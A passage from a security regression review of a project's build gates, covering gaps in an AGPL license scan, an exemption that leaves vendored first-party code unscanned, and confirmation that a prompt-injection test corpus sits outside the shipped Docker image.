  `license` field** is seen by the machine as "missing," not "AGPL," so it lands in the *clearable*
  exceptions queue instead of the hard deny. Break: reviewer writes "license unclear, assume permissive" →
  an AGPL dep is parked. Bounded (intersection of AGPL ∧ omitted-license is rare; human-gated) → MEDIUM,
  not HIGH. Violated invariant: "no AGPL in the dowiz tree, made mechanical" — mechanical only for
  *self-declaring* copyleft.
- **[MEDIUM] B-DATA · First-party `private` exemption blinds the gate to vendored copyleft (NEW).** Round 2
  exempts first-party workspace packages from the scan. The gate reads `node_modules/<pkg>/package.json`
  license *fields*, never source *contents*; the forbidden-`import` scan catches only known module *names*
  (`skyvern`, `langgraph`, …). So AGPL source copied into a first-party `packages/*/src/` file under an
  innocuous name is scanned by nothing. In round 1 such a package tripped the missing-license storm
  (incidentally blocked); the round-2 exemption removes that incidental block. Bounded (deliberate
  vendoring is visible in diff; §8.2 prose forbids it) → MEDIUM. Not a new HIGH.

### 3. Corpus relocation to repo-root `tests/injection-corpus/` — VERIFIED SOUND; structurally outside the build context.
- **Confirmed outside every build/copy path.** `Dockerfile:11-13` COPYs only `packages`, `apps`, `scripts`
  (+ root config files) — never a root `tests/`. `build-apps.ts:97-99` `cpSync` sources are `apps/api/public`
  and `apps/web/dist`, neither an ancestor of root `tests/`. `.dockerignore:7` bare `tests` correctly
  excludes the root-level dir. So the corpus is genuinely absent from the builder and the runtime image —
  no `COPY`, no `cpSync`, no nested-ignore edge case. The claim is accurate.
- **`path.resolve(repoRoot,…)` does NOT reintroduce a runtime path.** Because root `tests/` is not in the
  shipped image, even if a `src` file called `path.resolve(repoRoot,'tests/injection-corpus')` at runtime the
  dir is physically absent → `readdir` throws → no corpus delivered. The relocation *strengthens* runtime
  non-reachability rather than reopening it.
- **No project-ref / coverage sweep.** Root `tsconfig.base.json` has no `include`/`references`; `pnpm -r
  typecheck` runs per-package and none reference `../../tests`. The corpus is inert `.txt`, untouched by tsc
  / eslint (`.txt` not linted) / size-limit. No tooling sweeps it into an artifact.
- **[LOW] B-OPS · the canonical dir is NOT in the `test:unit` glob (NEW operational footgun, not a hole).**
  `package.json:32` runs `apps/api/tests/**`, `apps/worker/tests/**`, `apps/web/src/**`, `packages/**`,
  `tools/**/tests/**` — **root `tests/**` is absent.** The design keeps the behavioural test in
  `apps/api/tests/` (in-glob) reading data from root `tests/`, which is fine; but a future contributor who
  naturally co-locates `injection-corpus.test.ts` *with* the corpus at root `tests/` gets a silently
  non-running test (the dead-suite / false-green class). Worth a one-line guard/note; not a security hole.
- **Pre-existing noise (not a hole):** root `tests/` already holds `test-auth-rls.ts`/`test-stage7.ts`/
  `test-ws.ts`; the corpus inherits the same (correct) build-exclusion. No new reachability.

### Net FINAL regression verdict
| Mechanism | New CRITICAL/HIGH? | Residual |
|---|---|---|
| 1 · env-classification manifest | **No** | suffix + undeclared-`process.env` gaps are INHERITED; "fail-closed" wording over-states (LOW) |
| 2 · license scan + exceptions | **No** | 2 NEW MEDIUM: license-omitting-AGPL parkable; first-party-exempt vendored AGPL |
| 3 · corpus → repo-root `tests/` | **No** | structurally sound & verified; root `tests/` not in `test:unit` glob (LOW footgun) |

**0 new CRITICAL, 0 new HIGH.** The HARD-EXIT (0 CRITICAL / 0 HIGH) survives this regression attack. The
only new items are two MEDIUM license-soft-path residuals and a LOW test-glob footgun — none re-opens a
closed CRITICAL/HIGH and none crosses a red-line mechanically.
